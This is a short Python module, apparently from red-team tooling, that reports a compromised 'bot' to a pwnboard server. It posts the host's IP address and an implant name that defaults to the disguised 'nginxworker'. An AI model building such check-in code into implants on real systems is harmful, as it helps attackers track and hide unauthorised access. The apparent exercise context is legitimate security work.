import requests

"""
    pwnboard integration
    HTTP request to host/generic containing the IP address of bot (string) and name of implant
"""

def send_update(ip, host, name="nginxworker"):
    host = "http://" + host + "/generic"
    data = {'ip': ip, 'type': name}
    try:
        req = requests.post(host, json=data, timeout=3)
        return req.ok
    except Exception as E:
        print(E)
        return False